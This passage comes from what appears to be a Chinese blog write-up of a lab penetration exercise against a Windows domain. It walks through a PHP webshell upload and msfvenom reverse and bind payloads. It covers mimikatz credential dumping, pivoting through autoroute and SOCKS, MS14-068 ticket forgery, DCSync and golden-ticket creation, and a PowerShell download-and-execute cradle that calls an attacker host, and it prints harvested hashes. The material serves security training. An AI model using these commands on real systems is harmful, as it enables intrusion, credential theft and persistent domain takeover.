表====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>结果如下，发现了一个<code>admin.webhack123.com</code>子域名。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143022860.png" alt="image-20250512143022860"></p><p>成功找到了后台的管理站点。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143257291.png" alt="image-20250512143257291"></p><p>根据前面获取到的账号密码<code>admin/web123</code>可以登陆管理员界面。</p><h3 id="上传文件获取webshell">上传文件获取webshell</h3><p>登陆到管理员界面后，进行文件的上传。设置允许上传<code>php</code>，上传一句话木马<code>&lt;?php @eval($_POST['pass']);?&gt;</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512144703229.png" alt="image-20250512144703229"></p><p>上传成功，获取<code>shell</code>的<code>url</code>为<code>http://admin.webhack123.com/Public/Upload/20250512/d58f8404ac973d0352c666b9f83056a9.php</code>，使用蚁剑进行连接。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512145624138.png" alt="image-20250512145624138"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512150325172.png" alt="image-20250512150325172"></p><h2 id="MSF进行提权和信息收集">MSF进行提权和信息收集</h2><h3 id="生成攻击载荷">生成攻击载荷</h3><p><code>phpstudy</code>环境下，上传并执行<code>exe</code>文件，直接就是系统的最高权限了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=12345 -f exe -o tt.exe</span><br></pre></td></tr></table></figure><p>在本机的根目录会生成一个<code>tt.exe</code>文件。</p><h3 id="监听上线">监听上线</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.1.3</span><br><span class="line">lhost =&gt; 192.168.1.3</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>我使用的是<code>mac m1</code>环境安装的<code>msf</code>，监听发现一直报错，连接不上<code>shell</code>。这里我卡了很久，想破脑袋，也没想到把<code>mac</code>的防火墙关了就好了😑。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513113931755.png" alt="image-20250513113931755"></p><p>成功拿到<code>shell</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513114424829.png" alt="image-20250513114424829"></p><h3 id="migrate迁移进程">migrate迁移进程</h3><p>找到合适的进程，进行进程的迁移，这里很多人使用的是<code>migrate 476</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130552170.png" alt="image-20250513130552170"></p><p>迁移成功。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130700625.png" alt="image-20250513130700625"></p><h3 id="mimikatz哈希明文获取">mimikatz哈希明文获取</h3><p>使用<code>load kiwi</code>，加载<code>mimikatz</code>模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line">creds_wdigest</span><br><span class="line">creds_tspkg</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131257484.png" alt="image-20250513131257484"></p><p><code>arp</code>可以发现更多的主机。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131434911.png" alt="image-20250513131434911"></p><h2 id="跨网段域渗透">跨网段域渗透</h2><h3 id="MSF跨网段的域渗透">MSF跨网段的域渗透</h3><p>使用<code>metasploit</code>和<code>cobalt strike</code>进行域渗透。</p><h4 id="确认域环境">确认域环境</h4><p><code>ps</code>查看进程，进行令牌窃取，必须切换到<code>adminstrator</code>，非<code>system</code>，才能使用<code>net config workstation</code>⚠️</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133145485.png" alt="image-20250513133145485"></p><p>切换到<code>shell</code>，然后执行<code>net config workstation</code>。出现乱码情况时在获取的<code>shell</code>中执行<code>chcp 65001</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133609467.png" alt="image-20250513133609467"></p><h4 id="定位域控">定位域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133723239.png" alt="image-20250513133723239"></p><h4 id="域信息收集">域信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net time /domain #查看域控时间</span><br><span class="line">net view #遍历信任主机</span><br><span class="line">net view /domain #查看域</span><br><span class="line">net view /domain:hackbox</span><br><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135625840.png" alt="image-20250513135625840"></p><p><code>ipconfig</code>确认了存在两个网段<code>10.10.10.150</code>和<code>192.168.1.13</code>。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513135931643.png" alt="image-20250513135931643"></p><h4 id="终端执行信息收集命令">终端执行信息收集命令</h4><p><code>ipconfig /all</code>查看信息。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140129603.png" alt="image-20250513140129603"></p><p><code>dns 10.10.10.149</code>，<code>dns</code>一般都是与域控同一个<code>ip</code></p><h4 id="获取登陆过的用户信息">获取登陆过的用户信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513140428684.png" alt="image-20250513140428684"></p><p>获取的<code>SID</code>如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SID                                            Profile Path</span><br><span class="line">---                                            ------------</span><br><span class="line">S-1-5-18                                       C:\Windows\system32\config\systemprofile</span><br><span class="line">S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService</span><br><span class="line">S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService</span><br><span class="line">S-1-5-21-1443003717-4130318662-4279967973-500  C:\Users\Administrator</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-1103  C:\Users\web</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-500   C:\Users\Administrator.HACKBOX</span><br></pre></td></tr></table></figure><h4 id="添加路由渗透DC域控">添加路由渗透<code>DC</code>域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看全局路由器</span></span><br><span class="line">run get_local_subnets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加10段的路由信息</span></span><br><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看添加的路由表信息</span></span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回退，开启代理</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143458109.png" alt="image-20250513143458109"></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513143516484.png" alt="image-20250513143516484"></p><h4 id="开启代理通域控">开启代理通域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用代理模块</span></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置代理端口</span></span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">set SRVPORT 1080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看设置的情况</span></span><br><span class="line">show options</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513193150680.png" alt="image-20250513193150680"></p><p>注意本地使用的代理配置情况。我是用的是<code>proxychains4</code>，<code>Mac m</code>系列安装这个我又折腾好久😑，参考这个才给解决的，安装<code>proxychains4</code><sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。最好还是用<code>kali</code>，没这么多麻烦。</p><h4 id="nmap通过proxychains扫描域控设备">nmap通过proxychains扫描域控设备</h4><p>修改<code>proxychains</code>的配置文件，使其代理走的是<code>127.0.0.1 1080</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195812729.png" alt="image-20250513195812729"></p><p>执行命令，结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -A -Pn 10.10.10.149</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513195644245.png" alt="image-20250513195644245"></p><h4 id="永恒之蓝ms17-010进行溢出攻击DC-失败">永恒之蓝ms17-010进行溢出攻击DC(失败)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 10.10.10.149</span><br><span class="line">set RPORT 445</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513200141843.png" alt="image-20250513200141843"></p><p>攻击失败。</p><h4 id="ms14-068提权域控">ms14-068提权域控</h4><h5 id="ms14-068的条件">ms14-068的条件</h5><ul><li>获取域普通用户的账号密码<code>web@hackbox.com/!@#Qwe456</code></li><li>获取域普通用户的<code>SID: S-1-5-21-2005268815-658469957-1189185684-1103</code></li><li>服务器未打<code>KB3011780</code>补丁</li><li>域控服务器的<code>10.10.10.149</code></li></ul><h5 id="ms14-068创建票据">ms14-068创建票据</h5><p>上传<code>MS14-068.exe</code><sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>到执行的目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe456</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210324509.png" alt="image-20250513210324509"></p><h5 id="载入kiwi清理内存票据，再导入票据">载入kiwi清理内存票据，再导入票据</h5><p>载入<code>kiwi</code>，清理当前的票据，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_purge</span><br><span class="line">kerberos_ticket_list</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513210716497.png" alt="image-20250513210716497"></p><p>导入票据票据部分。</p><p>下载<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，并上传<code>mimikatz.exe、mimidrv.sys、mimilib.dll</code>到执行命令的目录，运行<code>mimikatz.exe</code>。</p><p>并执行<code>kerberos::ptc TGT_web@hackbox.com.ccache</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513212954123.png" alt="image-20250513212954123"></p><p><code>exit</code>退出<code>mimikatz</code>，<code>klist</code>查看当前票据。</p><p>未导入票据前去访问<code>dc</code>，如下：</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513211928318.png" alt="image-20250513211928318"></p><p>此时去访问<code>dc</code>域控，成功访问。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513213205104.png" alt="image-20250513213205104"></p><h4 id="获取dc域控制权限">获取dc域控制权限</h4><h5 id="生成正向载荷-copy复制到域控-并执行定时任务">生成正向载荷,copy复制到域控,并执行定时任务</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=13777 -f exe -o bind.exe</span><br></pre></td></tr></table></figure><p>生成<code>bind.exe</code>，并上传至<code>web</code>站点的服务器，并复制到域控中去。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy bind.exe \\dc\C$\  # 复制文件到目标</span><br><span class="line">net time \\dc # 查询dc时间</span><br><span class="line">at \\dc 21:51:00 c:/bind.exe #增加定时任务执行</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513214855544.png" alt="image-20250513214855544"></p><h5 id="获取域控权限命令">获取域控权限命令</h5><p>设置好定的时间，<code>msf</code>进行监听。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 10.10.10.149</span><br><span class="line">set lport 13777</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功连接至域控。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513222709163.png" alt="image-20250513222709163"></p><h4 id="获取dc域控哈希明文">获取dc域控哈希明文</h4><p>迁移进程，并获哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">migrate 388</span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223358934.png" alt="image-20250513223358934"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2cbe963d0d877c8cc7d09c936f1c3b33:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6f60ace6accbcb76078ccc0312174e98:::</span><br><span class="line">web:1103:aad3b435b51404eeaad3b435b51404ee:086a0bb1ed4ec72250760ea531bf8074:::</span><br><span class="line"><span class="meta prompt_">DC$</span><span class="language-bash">:1000:aad3b435b51404eeaad3b435b51404ee:961b3511aef13bfc4498d1e767ee2422:::</span></span><br><span class="line"><span class="meta prompt_">WEB$</span><span class="language-bash">:1104:aad3b435b51404eeaad3b435b51404ee:2a0edff7f95894d229b63285d32fc9c7:::</span></span><br></pre></td></tr></table></figure><p>使用<code>load kiwi</code>，并执行<code>creds_tspkg</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513223728435.png" alt="image-20250513223728435"></p><h4 id="抓域控全部hash">抓域控全部hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224001261.png" alt="image-20250513224001261"></p><h4 id="制作黄金票据">制作黄金票据</h4><p>考虑长期权维护，还是做一个黄金票据比较保险。</p><p>制作黄金票据需要满足以下条件：</p><ul><li><code>krbtgt</code>的<code>hash</code></li><li>本地管理员权限</li><li>域的<code>SID</code>（普通用户的<code>SID</code>除去最后三位就是域的<code>SID</code>）</li><li>域内任意用户的本地管理员权限</li></ul><h4 id="获取ntml-sid-rid">获取ntml sid rid</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount where name=&quot;krbtgt&quot; get sid</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224618826.png" alt="image-20250513224618826"></p><p>获取到的<code>SID: S-1-5-21-2005268815-658469957-1189185684-502</code></p><h4 id="窃取域控超级管理权限">窃取域控超级管理权限</h4><p>系统权限没办法做<code>dcsync</code>所以切换域管理权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">steal_token 2092</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513224933391.png" alt="image-20250513224933391"></p><p>获取到的内容为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class="line">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><h4 id="生成黄金票据">生成黄金票据</h4><p>获取到的条件如下：</p><p>1、<code>krbtgt</code>的<code>hash</code>：<code>6f60ace6accbcb76078ccc0312174e98</code></p><p>2、本地管理员权限：已获取</p><p>3、域的<code>SID</code>（普通用户的<code>SID</code>除去最后三位就是域的<code>SID</code>）：<code>S-1-5-21-2005268815-658469957-1189185684</code></p><p>4、域内任意用户的本地管理员权限：已获取。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d &lt;域名&gt; -u &lt;任意用户名&gt; -s &lt;Domain SID&gt; -k &lt;krbtgt NTLM Hash&gt; -t &lt;ticket 本</span><br><span class="line">地存储路径如:/Users/x2n/Desktop/webhack123.com/krbtgt.ticket&gt;</span><br></pre></td></tr></table></figure><p>根据获取的条件，进行黄金票据的生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u x2ntest -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230047465.png" alt="image-20250513230047465"></p><p>切换到<code>web</code>服务器，把凭据都清除掉。使用<code>kerberos_ticket_purge</code>，确保<code>dc</code>是无法访问的。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513230617747.png" alt="image-20250513230617747"></p><p>此时使用生成的票据<code>kerberos_ticket_use /Users/x2n/Desktop/webhack123.com/krbtgt.ticket</code>，成功访问到域控。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513231036926.png" alt="image-20250513231036926"></p><h3 id="CS进行内网域渗透">CS进行内网域渗透</h3><h4 id="建立teamserver">建立teamserver</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.1.3 4477 # 4477为密码</span><br></pre></td></tr></table></figure><p>设置好监听器，监听<code>192.168.1.3</code>，监听的端口为<code>8085</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512201453122.png" alt="image-20250512201453122"></p><h4 id="在web服务器上执行下载powershell恶意代码">在web服务器上执行下载powershell恶意代码</h4><p>使用<code>Windows Executable</code>去生成<code>.ps1</code>文件。</p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204448238.png" alt="image-20250512204448238"></p><p>再使用钓鱼攻击中的文件下载，获取下载的<code>URL</code>，为<code>http://192.168.1.3:8022/tt</code></p><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204756691.png" alt="image-20250512204756691"></p><p>进行上线。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.1.3:8022/tt&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512204314027.png" alt="image-20250512204314027"></p><h4 id="设置间隔时间">设置间隔时间</h4><p>设置时间间隔为0，不然会影响后面的操作。</p><p><img 